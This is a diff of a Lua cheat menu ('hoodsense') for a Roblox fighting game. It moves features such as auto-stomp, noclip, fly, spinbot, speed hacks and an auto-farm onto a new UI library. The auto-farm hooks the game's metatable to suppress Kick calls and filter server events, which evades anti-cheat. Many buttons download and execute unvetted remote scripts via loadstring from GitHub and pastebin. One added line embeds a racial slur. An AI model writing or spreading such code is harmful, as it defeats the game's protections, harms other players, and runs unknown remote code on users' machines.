+local AutoStomp = togglessector:AddToggle("Auto Stomp", nil, function(r)
     if r == true then
         game:GetService('RunService'):BindToRenderStep("Auto-Stomp", 0 , function()
             game:GetService("ReplicatedStorage").MainEvent:FireServer("Stomp")
@@ -415,8 +503,21 @@ local AutoStomp = Section12:CreateToggle("Auto-Stomp", nil, function(r)
         game:GetService('RunService'):UnbindFromRenderStep("Auto-Stomp")
     end
 end)
---AutoStomp:CreateKeybind("", function()
-local AntiStomp = Section12:CreateToggle("Anti-Stomp", nil, function(x)
+
+local AntiSlow = togglessector:AddToggle("Anti Slow", nil, function(gh)
+    if gh == true then
+        game:GetService('RunService'):BindToRenderStep("Anti-Slow", 0 , function()
+            if game.Players.LocalPlayer.Character.BodyEffects.Movement:FindFirstChild("NoWalkSpeed") then game.Players.LocalPlayer.Character.BodyEffects.Movement:FindFirstChild("NoWalkSpeed"):Destroy() end
+            if game.Players.LocalPlayer.Character.BodyEffects.Movement:FindFirstChild("ReduceWalk") then game.Players.LocalPlayer.Character.BodyEffects.Movement:FindFirstChild("ReduceWalk"):Destroy() end
+            if game.Players.LocalPlayer.Character.BodyEffects.Movement:FindFirstChild("NoJumping") then game.Players.LocalPlayer.Character.BodyEffects.Movement:FindFirstChild("NoJumping"):Destroy() end
+            if game.Players.LocalPlayer.Character.BodyEffects.Reload.Value == true then game.Players.LocalPlayer.Character.BodyEffects.Reload.Value = false end
+        end)
+    elseif gh == false then
+        game:GetService('RunService'):UnbindFromRenderStep("Anti-Slow")
+    end
+end)
+
+local AntiStomp = togglessector:AddToggle("Anti Stomp", nil, function(x)
     if x == true then
         game:GetService('RunService'):BindToRenderStep("Anti-Stomp", 0 , function()
             if game.Players.LocalPlayer.Character.Humanoid.Health <= 5 then
@@ -433,11 +534,15 @@ local AntiStomp = Section12:CreateToggle("Anti-Stomp", nil, function(x)
             end
         end)
     elseif x == false then
-        game:GetService('RunService'):UnbindFromRenderStep("Anti-Stomp")
+        game:GetService('RunService'):UnbindFromRenderStep("Anti Stomp")
     end
 end)
---AntiStomp:CreateKeybind("", function()
-local AutoReload = Section12:CreateToggle("Auto-Reload", nil, function(r)
+
+local antibag = togglessector:AddToggle('Anti Bag', false, function(State)
+    PuppywareSettings.Blatant.Character.AntiBag = State
+end)
+
+local AutoReload = togglessector:AddToggle("Auto Reload", nil, function(r)
     if r == true then
         game:GetService('RunService'):BindToRenderStep("Auto-Reload", 0 , function()
             if game:GetService("Players").LocalPlayer.Character:FindFirstChildWhichIsA("Tool") then
@@ -453,9 +558,12 @@ local AutoReload = Section12:CreateToggle("Auto-Reload", nil, function(r)
         game:GetService('RunService'):UnbindFromRenderStep("Auto-Reload")
     end
 end)
---AutoReload:CreateKeybind("", function()
 
-local Noclip = Section12:CreateButton("No Clip", function()
+local aura = togglessector:AddToggle("Auto Pick Cash", false, function(State)
+    PuppywareSettings.Blatant.Cash.AutoPickCash = State
+end)
+
+local Noclip = togglessector:AddButton("No Clip", function()
 local noclipplayer = game:GetService("Players").LocalPlayer
 local noclipmouse = noclipplayer:GetMouse()
  
@@ -487,22 +595,34 @@ obj.CanCollide = true
 end
 end
 end)
+game.StarterGui:SetCore("SendNotification", {
+    Title = "hoodsense";
+    Text = "Noclip keybind is B.";
+    Icon = "rbxassetid://8768441000";
+    Duration = "BLANK";
+    callbakc = bindableFunction;
+})
 end)
-Noclip:AddToolTip("Enables Noclip [B].")
 
 
-local fly2 = Section12:CreateButton("Fly", function()
+local fly2 = togglessector:AddButton("Fly", function()
     loadstring(Game:HttpGet('https://raw.githubusercontent.com/eksotopro/holders/main/fly.lua'))()
+    game.StarterGui:SetCore("SendNotification", {
+        Title = "hoodsense";
+        Text = "Fly keybind is X.";
+        Icon = "rbxassetid://8768441000";
+        Duration = "BLANK";
+        callbakc = bindableFunction;
+    })
 end)
-fly2:AddToolTip("Enables fly [X]")
 
-local fovchanger = Section12:CreateSlider("Change Fov", 0,120,nil,true, function(value)
+local fovchanger = togglessector:AddSlider("Change Fov", 1, 70, 120, 1, function(value)
     game:GetService'Workspace'.Camera.FieldOfView = value
 end)
 
 getgenv().SpinBotSpeed = 20
 
-local spinbot = Section12:CreateToggle("Spin Bot", nil, function(state)
+local spinbot = togglessector:AddToggle("Spin Bot", nil, function(state)
 	function getRoot(char)
 				local rootPart = char:FindFirstChild('HumanoidRootPart') or char:FindFirstChild('UpperTorso')
 				return rootPart
@@ -522,67 +642,26 @@ local spinbot = Section12:CreateToggle("Spin Bot", nil, function(state)
 				end
 			end
 		end)
-spinbot:CreateKeybind("", function()
-end)
-spinbot:AddToolTip("Enables spinbot.")
+spinbot:AddKeybind()
 
-local spinbotspeed = Section12:CreateSlider("Spinbot Speed",20,50,nil,true, function(a)
-    getgenv().SpinBotSpeed = a
-end)
-spinbotspeed:SetValue(20)
-spinbotspeed:AddToolTip("Reset spinbot after changing.")
---[[-------------------------------------------------------------------
--------------------------//  OTHER MODS   ------------------------
-
-local reset = Section98:CreateButton("Reset Character", function(reset)
-    game.Players.LocalPlayer.Character.Humanoid.Health = 0
-end)
-reset:AddToolTip("Resets your character")
-]]
---------------------------------------------------------------------
------------------------------//  ESP   ---------------------------
-local espToggle = Section99:CreateToggle("Enable ESP", nil, function(bool)
-    ESP:Toggle(bool)
-end)
-espToggle:AddToolTip("Enables ESP.")
-espToggle:CreateKeybind("", function()
+local spinbotspeed = togglessector:AddSlider("Spinbot Speed", 1, 20, 50, 1, function(value)
+    getgenv().SpinBotSpeed = value
 end)
 
-local tracersToggle = Section99:CreateToggle("Enable Tracers", nil, function(bool)
-    ESP.Tracers = bool
-end)
-tracersToggle:AddToolTip("Enables Tracers.")
+--- Visuals Tab ---
+local VisualsTab = Window:CreateTab("Avatar")
+local VisualsSection = VisualsTab:CreateSector("Character", "left")
+local VisualsSection2 = VisualsTab:CreateSector("Other", "right")
 
-local namesToggle = Section99:CreateToggle("Enable Names", nil, function(bool)
-    ESP.Names = bool
-end)
-namesToggle:AddToolTip("Enables Names.")
-
-local boxesToggle = Section99:CreateToggle("Enable Boxes", nil, function(bool)
-    ESP.Boxes = bool
-end)
-tracersToggle:AddToolTip("Enables Boxes.")
-
-local espcolor = Section99:CreateColorpicker("Esp Color", function(color)
-	ESP.Color = color
-end)
-espcolor:UpdateColor(Color3.fromRGB(20, 124, 255))
-espcolor:AddToolTip("Change ESP Color.")
-
----------------------------------------------------------------------
--------------------------//  AVATAR MODS   ------------------------
-
-local animationgamepass = Section6:CreateButton("Animation Gamepass", function()
+local animationgamepass = VisualsSection:AddButton("Animation Gamepass", function()
 	loadstring(game:HttpGet('https://raw.githubusercontent.com/eksotopro/holders/main/animation_gamepass.lua'))()
 end)
-animationgamepass:AddToolTip("Loads Animation Gamepass.")
 
-local animbutton = Section6:CreateButton("Animations", function(bool)
+local animbutton = VisualsSection:AddButton("Animations", function(bool)
     loadstring(game:HttpGet("https://raw.githubusercontent.com/eksotopro/holders/main/anims.lua"))()
 end)
-animbutton:AddToolTip("Changes your animations.")
 
-local headlbutton = Section6:CreateButton("Headless", function(bool)
+local headlbutton = VisualsSection:AddButton("Headless", function(bool)
 game.Players.LocalPlayer.Character.Head.Transparency = 1
 for i,v in pairs(game.Players.LocalPlayer.Character.Head:GetChildren()) do
 if (v:IsA("Decal")) then
@@ -590,21 +669,8 @@ v:Destroy()
 end
 end
 end)
-headlbutton:AddToolTip("Makes you headless. [NOT FE]")
 
-local korbloxbutton = Section6:CreateButton("Korblox", function(bool)
-    local ply = game.Players.LocalPlayer
-    local chr = ply.Character
-    chr.RightLowerLeg.MeshId = "rbxassetid://902942093"
-    chr.RightLowerLeg.Transparency = "1"
-    chr.RightUpperLeg.MeshId = "http://www.roblox.com/asset/?id=902942096"
-    chr.RightUpperLeg.TextureID = "http://roblox.com/asset/?id=902843398"
-    chr.RightFoot.MeshId = "rbxassetid://902942089"
-    chr.RightFoot.Transparency = "1"
-end)
-korbloxbutton:AddToolTip("Gets you korblox [NOT FE]")
-
-local animatedbeastmode = Section6:CreateButton("Animated Beast Mode", function()
+local animatedbeastmode = VisualsSection:AddButton("Animated Beast Mode", function()
 	while true do
 local player = game.Players.LocalPlayer.Character
 if player:findFirstChild("Humanoid") then
@@ -617,205 +683,236 @@ if player:findFirstChild("Humanoid") then
 wait(1)
 end
 end)
-animatedbeastmode:AddToolTip("Makes your face animated.")
 
----------------------------------------------------------------------
---------------------------//  FACE MODS   -------------------------
+local facesection = VisualsTab:CreateSector("Face Changer", "left")
 
-local meanie = Section7:CreateButton("Meanie", function()
+local meanie = facesection:AddButton("Meanie", function()
 	loadstring(game:HttpGet('https://raw.githubusercontent.com/eksotopro/holders/main/faces/508490451.lua'))()
 end)
-meanie:AddToolTip("Changes your face to Meanie.")
 
-local sshf = Section7:CreateButton("Super Super Happy Face", function()
+local sshf = facesection:AddButton("Super Super Happy Face", function()
 	loadstring(game:HttpGet('https://raw.githubusercontent.com/eksotopro/holders/main/faces/494290547.lua'))()
 end)
-sshf:AddToolTip("Changes your face to Super Super Happy Face.")
 
-local silverpunk = Section7:CreateButton("Silver Punk Face", function()
+local silverpunk = facesection:AddButton("Silver Punk Face", function()
 	loadstring(game:HttpGet('https://raw.githubusercontent.com/eksotopro/holders/main/faces/387256104.lua'))()
 end)
-silverpunk:AddToolTip("Changes your face to Silver Punk Face.")
 
-local yum = Section7:CreateButton("Yum", function()
+local yum = facesection:AddButton("Yum", function()
 	loadstring(game:HttpGet('https://raw.githubusercontent.com/eksotopro/holders/main/faces/26018945.lua'))()
 end)
-yum:AddToolTip("Changes your face to Yum.")
 
-local playful = Section7:CreateButton("Playful Vampire", function()
+local playful = facesection:AddButton("Playful Vampire", function()
 	loadstring(game:HttpGet('https://raw.githubusercontent.com/eksotopro/holders/main/faces/2409281591.lua'))()
 end)
-playful:AddToolTip("Changes your face to Playful Vampire.")
 
-local beastmode = Section7:CreateButton("Beast Mode", function()
+local beastmode = facesection:AddButton("Beast Mode", function()
 	loadstring(game:HttpGet('https://raw.githubusercontent.com/eksotopro/holders/main/faces/127959433.lua'))()
 end)
-beastmode:AddToolTip("Changes your face to Beast Mode.")
 
---------------------------------------------------------------------
---------------------------//  TELEPORTS  -------------------------
---------------------------    GUNS     //-------------------------
---------------------------------------------------------------------
-local revolver = Section5:CreateButton("Revolver", function(bool)
-    game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-638.75, 18.8500004, -118.175011, -1, 0, 0, 0, 1, 0, 0, 0, -1)
+--- Misc Tab ---
+local MiscTab = Window:CreateTab("Misc")
+local MiscSection = MiscTab:CreateSector("Miscelanious", "left")
+local scriptsSection = MiscTab:CreateSector("Fun Stuff", "right")
+local autofarmsection = MiscTab:CreateSector("Auto Farm", "left")
+local autofarm = autofarmsection:AddToggle("Auto Farm", nil, function(texto)
+        repeat
+            wait()
+        until game:IsLoaded()
+        local gm = getrawmetatable(game)
+        setreadonly(gm, false)
+        local namecall = gm.__namecall
+        gm.__namecall =
+            newcclosure(
+            function(self, ...)
+                local args = {...}
+                if not checkcaller() and getnamecallmethod() == "FireServer" and tostring(self) == "MainEvent" then
+                    if tostring(getcallingscript()) ~= "Framework" then
+                        return
+                    end
+                end
+                if not checkcaller() and getnamecallmethod() == "Kick" then
+                    return
+                end
+                return namecall(self, unpack(args))
+            end
+        )
+        
+        local LocalPlayer = game:GetService("Players").LocalPlayer
+        
+        function gettarget()
+            local Character = LocalPlayer.Character or LocalPlayer.CharacterAdded:wait()
+            local HumanoidRootPart = Character:WaitForChild("HumanoidRootPart")
+            local maxdistance = math.huge
+            local target
+            for i, v in pairs(game:GetService("Workspace").Cashiers:GetChildren()) do
+                if v:FindFirstChild("Head") and v:FindFirstChild("Humanoid") and v.Humanoid.Health > 0 then
+                    local distance = (HumanoidRootPart.Position - v.Head.Position).magnitude
+                    if distance < maxdistance then
+                        target = v
+                        maxdistance = distance
+                    end
+                end
+            end
+            return target
+        end
+        
+        for i, v in pairs(workspace:GetDescendants()) do
+            if v:IsA("Seat") then
+                v:Destroy()
+            end
+        end
+        
+        shared.MoneyFarm = texto
+        
+        while shared.MoneyFarm do
+            wait()
+            local Target = gettarget()
+            repeat
+                wait()
+                pcall(
+                    function()
+                        local Character = LocalPlayer.Character or LocalPlayer.CharacterAdded:wait()
+                        local HumanoidRootPart = Character:WaitForChild("HumanoidRootPart")
+                        local Combat = LocalPlayer.Backpack:FindFirstChild("Combat") or Character:FindFirstChild("Combat")
+                        if not Combat then
+                            Character:FindFirstChild("Humanoid").Health = 0
+                            return
+                        end
+                        HumanoidRootPart.CFrame = Target.Head.CFrame * CFrame.new(0, -2.5, 3)
+                        Combat.Parent = Character
+                        Combat:Activate()
+                    end
+                )
+            until not Target or Target.Humanoid.Health < 0
+            for i, v in pairs(game:GetService("Workspace").Ignored.Drop:GetDescendants()) do
+                if v:IsA("ClickDetector") and v.Parent and v.Parent.Name:find("Money") then
+                    local Character = LocalPlayer.Character or LocalPlayer.CharacterAdded:wait()
+                    local HumanoidRootPart = Character:WaitForChild("HumanoidRootPart")
+                    if (v.Parent.Position - HumanoidRootPart.Position).magnitude <= 18 then
+                        repeat
+                            wait()
+                            fireclickdetector(v)
+                        until not v or not v.Parent.Parent
+                    end
+                end
+            end
+            wait(1)
+        end
+    end)
+autofarm:AddKeybind()
+
+local fpsboost = MiscSection:AddButton('Low gfx', function(state)
+    if state then
+    
+        local decalsyeeted = true -- Leaving this on makes games look shitty but the fps goes up by at least 20.
+        local g = game
+        local w = g.Workspace
+        local l = g.Lighting
+        local t = w.Terrain
+        t.WaterWaveSize = 0
+        t.WaterWaveSpeed = 0
+        t.WaterReflectance = 0
+        t.WaterTransparency = 0
+        l.GlobalShadows = false
+        l.FogEnd = 9e9
+        l.Brightness = 0
+        settings().Rendering.QualityLevel = "Level01"
+        for i, v in pairs(g:GetDescendants()) do
+            if v:IsA("Part") or v:IsA("Union") or v:IsA("CornerWedgePart") or v:IsA("TrussPart") then
+                v.Material = "Plastic"
+                v.Reflectance = 0
+            elseif v:IsA("Decal") or v:IsA("Texture") and decalsyeeted then
+                v.Transparency = 1
+            elseif v:IsA("ParticleEmitter") or v:IsA("Trail") then
+                v.Lifetime = NumberRange.new(0)
+            elseif v:IsA("Explosion") then
+                v.BlastPressure = 1
+                v.BlastRadius = 1
+            elseif v:IsA("Fire") or v:IsA("SpotLight") or v:IsA("Smoke") then
+                v.Enabled = false
+            elseif v:IsA("MeshPart") then
+                v.Material = "Plastic"
+                v.Reflectance = 0
+                v.TextureID = 10385902758728957
+            end
+        end
+        for i, e in pairs(l:GetChildren()) do
+            if e:IsA("BlurEffect") or e:IsA("SunRaysEffect") or e:IsA("ColorCorrectionEffect") or e:IsA("BloomEffect") or e:IsA("DepthOfFieldEffect") then
+                e.Enabled = false
+            end
+        end
+    else
+      end
 end)
 
-local ak = Section5:CreateButton("Ak", function(bool)
-    game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-587.529358, 5.39480686, -753.717712, -1, 0, 0, 0, 1, 0, 0, 0, -1)
-end)
-
-local smg = Section5:CreateButton("Smg", function(bool)
-    game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-577.123413, 5.47666788, -718.031433, -1, 0, 0, 0, 1, 0, 0, 0, -1)
-end)
-
-local ar = Section5:CreateButton("AR", function(bool)
-    game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-591.824158, 5.46046877, -744.731628, 0, 0, 1, 0, 1, -0, -1, 0, 0)
-end)
-
-local dbs = Section5:CreateButton("Double Barrel", function(bool)
-    game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-1039.59985, 18.8513641, -256.449951, -1, 0, 0, 0, 1, 0, 0, 0, -1)
-end)
-
-local shotgun = Section5:CreateButton("Shotgun", function(bool)
-    game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-578.623657, 5.47212696, -725.131531, 0, 0, 1, 0, 1, -0, -1, 0, 0)
-end)
-
-local flame = Section5:CreateButton("Flame Thrower", function(bool)
-    game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-157.122437, 50.9120102, -104.93145, 1, 0, 0, 0, 1, 0, 0, 0, 1)
-end)
-
-local tac = Section5:CreateButton("Tactical Shotgun", function(bool)
-    game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(470.877533, 45.1272316, -620.630676, 1, 0, 0, 0, 1, 0, 0, 0, 1)
-end)
-
-local rpg = Section5:CreateButton("Rpg", function(bool)
-    game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(118.664856, -29.6487694, -272.349792, -1, 0, 0, 0, 1, 0, 0, 0, -1)
-end)
-
-local drumgun = Section5:CreateButton("Drum Gun", function(bool)
-    game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-83.548996, 19.7020588, -82.1449585, 1, 0, 0, 0, 1, 0, 0, 0, 1)
-end)
-
-local armor = Section5:CreateButton("High Medium Armor", function(bool)
-	game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-939, -25, 571)
-end)
-
-local bat = Section5:CreateButton("Bat", function(bool)
-	game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(380, 49, -283)
-end)
-
-local mediumarmor = Section5:CreateButton("Medium Armor", function(bool)
-	game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(528, 50, -637)
-end)
---------------------------------------------------------------------
---------------------------//  TELEPORTS  -------------------------
---------------------------   PLACES    //-------------------------
---------------------------------------------------------------------
-local church = Section11:CreateButton("Church", function(bool)
-    game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(147.299988, 18.8493252, 31.7999744, 0, 0, 1, 0, 1, -0, -1, 0, 0)
-end)
-
-local admin1 = Section11:CreateButton("Admin Guns", function(bool)
-    game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-872.853516, -34.4276848, -538.013306, -0.999724388, -3.9898886e-08, -0.0234765243, -3.9204977e-08, 1, -3.00177518e-08, 0.0234765243, -2.90890814e-08, -0.999724388)
-end)
-
-local admin2 = Section11:CreateButton("Admin Guns 2", function(bool)
-    game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-808.708557, -39.6492004, -932.789368, 0.999899805, 2.01343173e-08, -0.0141554065, -2.17800533e-08, 1, -1.16108232e-07, 0.0141554065, 1.16404912e-07, 0.999899805)
-end)
-
-local admin3 = Section11:CreateButton("Admin Food", function(bool)
-    game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-788.053406, -39.6492004, -932.951233, 0.998369277, 2.46515359e-08, 0.0570784509, -2.8773524e-08, 1, 7.13949646e-08, -0.0570784509, -7.29209759e-08, 0.998369277)
-end)
-
-local ufo = Section11:CreateButton("Ufo", function(bool)
-    game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(2.85052466, 132, -736.571106, -0.0460956171, -4.24733706e-08, -0.998937011, 7.26012459e-08, 1, -4.58687275e-08, 0.998937011, -7.46384217e-08, -0.0460956171)
-end)
-
-local casino = Section11:CreateButton("Casino", function(bool)
-    game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-995, 21.6998043, -153.100037, 1, 0, 0, 0, 1, 0, 0, 0, 1)
-end)
-
-local bank = Section11:CreateButton("Bank", function(bool)
-    game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-318.891174, 80.2145309, -257.177429, 0.0479469746, -5.14644114e-08, 0.998850107, -3.12971538e-09, 1, 5.16738901e-08, -0.998850107, -5.60372015e-09, 0.0479469746)
-end)
-
-local taco = Section11:CreateButton("Taco", function(bool)
-    game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(584.026855, 48.1605072, -474.033936, 1, 0, 0, 0, 1, 0, 0, 0, 1)
-end)
-
-local revRoof = Section11:CreateButton("Revolver Roof", function(bool)
-    game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-634.463135, 80.434761, -204.232559, -0.0190527271, -1.03574322e-07, -0.999818563, 4.36709335e-09, 1, -1.03676342e-07, 0.999818563, -6.3416179e-09, -0.0190527271)
-end)
-
-local playground = Section11:CreateButton("PlayGround", function(bool)
-    game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-282.694153, 19.7496624, -807.719727, 1, 0, 0, 0, 1, 0, 0, 0, 1)
-end)
-
-local gas = Section11:CreateButton("Gas Station", function(bool)
-    game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(604.800415, 46.0998344, -258.249573, 0, 0, 1, 0, 1, -0, -1, 0, 0)
-end)
-
-local cementery = Section11:CreateButton("Cementery", function(bool)
-    game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(135.109558, 99.75, -57.2315979, 0.999993503, -0.000633752206, -0.0035054055, 0.000638642872, 0.999998808, 0.00139435288, 0.00350463158, -0.00139658386, 0.999992728)
-end)
-
-local school = Section11:CreateButton("School Roof", function(bool)
-    game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-525.353455, 68.125, 311.824402, 0.999992013, 1.03866675e-08, -0.00399552286, -1.03507425e-08, 1, 9.01170427e-09, 0.00399552286, -8.97027519e-09, 0.999992013)
-end)
-
---------------------------------------------------------------------
---------------------------//   EXTRA  ----------------------------
---------------------------   STUFF  //----------------------------
---------------------------------------------------------------------
-local rejoin = Section8:CreateButton("Rejoin", function()
+local rejoin = MiscSection:AddButton("Rejoin", function(State)
     loadstring(game:HttpGet("https://pastebin.com/raw/1gtVMUz3"))()
 end)
-rejoin:AddToolTip("Rejoins Server.")
-
-local hop = Section8:CreateButton("Server hop", function()
-	loadstring(game:HttpGet('https://raw.githubusercontent.com/eksotopro/holders/main/serverhop.lua'))()
+    
+local hop = MiscSection:AddButton("Server hop", function(State)
+    loadstring(game:HttpGet('https://raw.githubusercontent.com/eksotopro/holders/main/serverhop.lua'))()
 end)
-local trash = Section8:CreateButton("Trash Talk", function()
+local trash = MiscSection:AddButton("Trash Talk", function(State)
     loadstring(game:HttpGet("https://raw.githubusercontent.com/eksotopro/holders/main/trash_talk.lua"))()
+    game.StarterGui:SetCore("SendNotification", {
+        Title = "hoodsense";
+        Text = "Trash Talk keybind is J.";
+        Icon = "rbxassetid://8768441000";
+        Duration = "BLANK";
+        callbakc = bindableFunction;
+    })
 end)
-trash:AddToolTip("Loads Trash Talk. [J]")
 
-local macro = Section8:CreateButton("Fake Macro", function()
-    loadstring(game:HttpGet("https://pastebin.com/raw/yMmUUyyE"))()
+local macro = MiscSection:AddButton("Fake Macro", function(State)
+   loadstring(game:HttpGet("https://pastebin.com/raw/yMmUUyyE"))()
+    game.StarterGui:SetCore("SendNotification", {
+        Title = "hoodsense";
+        Text = "Fake Macro keybind is Z.";
+        Icon = "rbxassetid://8768441000";
+        Duration = "BLANK";
+        callbakc = bindableFunction;
+    })
 end)
-macro:AddToolTip("Loads Fake Macro. [Z]")
 
-local fly = Section8:CreateButton("Fly", function()
+local fly = MiscSection:AddButton("Fly", function(State)
     loadstring(game:HttpGet("https://raw.githubusercontent.com/eksotopro/holders/main/fly.lua"))()
+    game.StarterGui:SetCore("SendNotification", {
+        Title = "hoodsense";
+        Text = "Fly keybind is X.";
+        Icon = "rbxassetid://8768441000";
+        Duration = "BLANK";
+        callbakc = bindableFunction;
+    })
 end)
-fly:AddToolTip("Loads Fly. [X]")
 
-local fullbright = Section8:CreateButton("Full Bright", function()
+local fullbright = MiscSection:AddButton("Full Bright", function(State)
     loadstring(game:HttpGet("https://raw.githubusercontent.com/eksotopro/holders/main/full_bright.lua"))()
 end)
-fullbright:AddToolTip("Loads Full Bright.")
 
-local nocooldown = Section8:CreateButton("No jump cooldown", function()
-	loadstring(game:HttpGet('https://raw.githubusercontent.com/eksotopro/holders/main/no-jump-cooldown.lua'))()
+local nocooldown = MiscSection:AddButton("No jump cooldown", function(State)
+    loadstring(game:HttpGet('https://raw.githubusercontent.com/eksotopro/holders/main/no-jump-cooldown.lua'))()
 end)
-nocooldown:AddToolTip("Removes jump cooldown.")
-
-local weightfarm = Section8:CreateButton("Weight Farm", function()
-	loadstring(game:HttpGet('https://raw.githubusercontent.com/eksotopro/holders/main/weight_farm.lua'))()
+    
+local weightfarm = MiscSection:AddButton("Weight Farm", function(State)
+    loadstring(game:HttpGet('https://raw.githubusercontent.com/eksotopro/holders/main/weight_farm.lua'))()
 end)
-weightfarm:AddToolTip("Runs Weight Farm.")
-
-local god = Section9:CreateButton("God Mode", function()
+local god = MiscSection:AddButton("God Mode", function(State)
     loadstring(game:HttpGet('https://raw.githubusercontent.com/eksotopro/holders/main/godmode.lua'))()
+    game.StarterGui:SetCore("SendNotification", {
+    Title = "hoodsense";
+    Text = "This can't be stopped.";
+    Icon = "rbxassetid://8768441000";
+    Duration = "BLANK";
+    callbakc = bindableFunction;
+    })
 end)
-god:AddToolTip("Makes you god mode. [THIS CANT BE STOPPED]")
 
-local reset = Section8:CreateButton("Reset Character", function(reset)
+local reset = MiscSection:AddButton("Reset Character", function(reset)
     game.Players.LocalPlayer.Character.Humanoid.Health = 0
 end)
-reset:AddToolTip("Resets your character")
 
-local idepomilion = Section8:CreateButton('Sing', function()
+local idepomilion = MiscSection:AddButton('Sing', function(State)
     game.ReplicatedStorage.DefaultChatSystemChatEvents.SayMessageRequest:FireServer("Mam głód pierdolę wszystko","All")
 wait(1)
 game.ReplicatedStorage.DefaultChatSystemChatEvents.SayMessageRequest:FireServer("ty stój kiedy idę po milion","All")
@@ -831,16 +928,36 @@ wait(0.9)
 game.ReplicatedStorage.DefaultChatSystemChatEvents.SayMessageRequest:FireServer("bo bo idę po milion", "All")
 end)
 
---------------------------------------------------------------------
---------------------------//    FUN   ----------------------------
---------------------------   STUFF  //----------------------------
---------------------------------------------------------------------
-local swagfly = Section9:CreateButton("Admin Fly", function ()
-    loadstring(game:HttpGet('https://raw.githubusercontent.com/eksotopro/holders/main/cracked%20stuff/admin_fly.lua'))()
+local MovementSector = MiscTab:CreateSector("Movement", "right")
+local SpeedToggle = MovementSector:AddToggle('Speed Enabled', false, function(State)
+    PuppywareSettings.Blatant.Movement.SpeedEnabled = State
 end)
-swagfly:AddToolTip("Loads Swag Mode Admin Fly! [X]")
 
-local Juggernaut = Section9:CreateButton("Juggernaut", function()
+SpeedToggle:AddSlider(0, 5, 10, 1, function(Value)
+    PuppywareSettings.Blatant.Movement.SpeedAmount = Value
+end)
+
+MovementSector:AddDropdown("Speed Type", {"CFrame"}, "CFrame", false, function(Value)
+    PuppywareSettings.Blatant.Movement.SpeedType = Value
+end)
+
+MovementSector:AddDropdown("Speed Render Type", {"Default", "Fast"}, "Default", false, function(Value)
+    PuppywareSettings.Blatant.Movement.SpeedRenderType = Value
+end)
+SpeedToggle:AddKeybind()
+
+local swagfly = scriptsSection:AddButton("Admin Fly", function ()
+    loadstring(game:HttpGet('https://raw.githubusercontent.com/eksotopro/holders/main/cracked%20stuff/admin_fly.lua'))()
+    game.StarterGui:SetCore("SendNotification", {
+        Title = "hoodsense";
+        Text = "Admin Fly keybind is X.";
+        Icon = "rbxassetid://8768441000";
+        Duration = "BLANK";
+        callbakc = bindableFunction;
+    })
+end)
+
+local Juggernaut = scriptsSection:AddButton("Juggernaut", function()
     local LocalPlayer = game:GetService("Players").LocalPlayer
     local Mouse = LocalPlayer:GetMouse()
     local OriginalKeyUpValue = 0
@@ -951,31 +1068,29 @@ local Juggernaut = Section9:CreateButton("Juggernaut", function()
     end
     Tool()
 end)
-Juggernaut:AddToolTip("Makes you Juggernaut.")
 
-local avatarchanger = Section9:CreateButton("Avatar Modifier", function()
+local avatarchanger = scriptsSection:AddButton("Avatar Modifier", function()
 	loadstring(game:HttpGet('https://raw.githubusercontent.com/eksotopro/holders/main/cracked%20stuff/facechanger.lua'))()
 end)
-avatarchanger:AddToolTip("Loads Avatar Modifier. [NOT FE]")
 
-local ben = Section9:CreateButton("Ben Talk", function()
+local ben = scriptsSection:AddButton("Ben Talk", function()
     loadstring(game:HttpGet("https://raw.githubusercontent.com/eksotopro/holders/main/ben.lua"))()
+    game.StarterGui:SetCore("SendNotification", {
+        Title = "hoodsense";
+        Text = "Ben talk keybind is K.";
+        Icon = "rbxassetid://8768441000";
+        Duration = "BLANK";
+        callbakc = bindableFunction;
+    })
 end)
-ben:AddToolTip("Loads Ben Talk. [K]")
-
-local swagfly = Section9:CreateButton("Admin Fly", function()
-	loadstring(game:HttpGet('https://raw.githubusercontent.com/eksotopro/holders/main/cracked%20stuff/admin_fly.lua'))()
-end)
-swagfly:AddToolTip("Loads Swag Mode Admin Fly. [X]")
 
 
-local panic = Section9:CreateButton("Rage quit", function()
+local panic = scriptsSection:AddButton("Rage quit", function()
 	loadstring(game:HttpGet('https://raw.githubusercontent.com/eksotopro/holders/main/ragequit.lua'))()
 end)
-panic:AddToolTip("Why u mad bro?")
 
-local superjump = Section9:CreateButton("Super Jump!", function()
-    local  MyStand = "DxskTilIDawn"
+local superjump = scriptsSection:AddButton("Super Jump", function()
+    local  MyStand = "niggerballs69"
     local SuperJumpEnabled = false
     
     getgenv().Toggled = false
@@ -1461,11 +1576,17 @@ local superjump = Section9:CreateButton("Super Jump!", function()
                 end
             end
         end
-    end)	
+    end)
+        game.StarterGui:SetCore("SendNotification", {
+        Title = "hoodsense";
+        Text = "Super Jump keybind is H.";
+        Icon = "rbxassetid://8768441000";
+        Duration = "BLANK";
+        callbakc = bindableFunction;
+    })
 end)
-superjump:AddToolTip("Tip: Type 'Time erase!' in chat to time erase")
 
